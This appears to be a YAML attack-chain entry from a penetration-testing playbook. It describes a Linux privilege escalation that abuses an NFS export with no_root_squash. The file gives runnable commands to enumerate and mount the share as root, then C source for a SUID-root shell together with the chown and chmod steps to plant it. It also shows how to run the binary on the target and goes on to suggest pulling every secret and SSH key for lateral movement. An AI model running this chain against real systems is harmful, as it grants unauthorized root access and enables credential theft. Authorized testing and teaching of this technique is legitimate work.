id: nfs-no-root-squash
name: "Linux PE — NFS no_root_squash → SUID drop → root"
description: >
  An exported NFS share with `no_root_squash` (or `no_all_squash`) lets a
  root-mounted client write files owned by uid 0 on the remote filesystem.
  Drop a SUID binary, run it on the target, root.
tags: [linux, priv-esc, nfs, classic-linux]
difficulty: easy

inputs:
  - name: target_ip
    description: "NFS server IP."
    source: target_context.ip
    required: true

steps:
  - id: enum_shares
    name: "Enumerate exports"
    inline_command: "showmount -e <ip>"
    inputs:
      ip: "${target_ip}"
    notes: |
      Look for `/something *` (no host restriction) and `(no_root_squash)`
      in /etc/exports on the server. The first means you can mount it from
      anywhere; the second is the privesc primitive.

  - id: confirm_no_root_squash
    command_ref: nxc-nfs-shares
    inputs:
      ip: "${target_ip}"
    name: "Confirm no_root_squash via NetExec NFS module"

  - id: mount_share
    name: "Mount the export locally as root"
    inline_command: |
      mkdir -p /mnt/nfs
      sudo mount -t nfs <ip>:/path/to/share /mnt/nfs -o nolock
      ls -la /mnt/nfs
    inputs:
      ip: "${target_ip}"
    notes: |
      `-o nolock` avoids the rpc.statd dance. Files inside the share now
      show their actual owner uids — sometimes you can already read
      passwords / SSH keys without the SUID trick.

  - id: drop_suid
    name: "Compile a tiny SUID-root shell and drop it"
    inline_command: |
      cat > /tmp/x.c <<'EOF'
      #include <stdio.h>
      #include <unistd.h>
      int main() { setreuid(0, 0); execve("/bin/sh", NULL, NULL); return 0; }
      EOF
      gcc /tmp/x.c -o /mnt/nfs/.sh
      sudo chown root:root /mnt/nfs/.sh
      sudo chmod 4755 /mnt/nfs/.sh

  - id: trigger_on_target
    name: "Run the SUID binary on the target (any low-priv shell)"
    inline_command: "/path/to/share/.sh -p  # -p preserves the effective UID"
    notes: |
      Get a low-priv shell on the target first (SSH key from the share,
      web RCE, anything). Then run the SUID binary you just dropped → root.

  - id: confirm
    name: "Confirm root"
    inline_command: "id"

references:
  - title: "HackTricks — NFS"
    url:   "https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html"
  - title: "no_root_squash explained"
    url:   "https://man7.org/linux/man-pages/man5/exports.5.html"

next_chains:
  - chain: shell-stabilization
    when:   'rooted shell is messy'
    reason: 'Upgrade the new root shell.'
  - chain: linux-priv-esc-recon
    when:   'pivoting to other hosts'
    reason: 'Now root — pull every secret, including SSH keys for lateral.'
